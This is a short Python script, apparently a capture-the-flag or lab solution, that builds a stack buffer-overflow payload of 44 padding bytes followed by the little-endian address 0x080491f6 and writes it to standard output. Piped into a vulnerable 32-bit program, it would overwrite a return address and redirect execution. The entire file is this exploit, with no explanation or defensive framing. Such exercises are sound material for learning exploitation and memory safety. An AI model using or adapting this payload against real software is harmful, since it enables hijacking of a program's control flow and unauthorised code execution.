import sys

payload = b"A"*44
payload += b"\xf6\x91\x04\x08"

sys.stdout.buffer.write(payload)
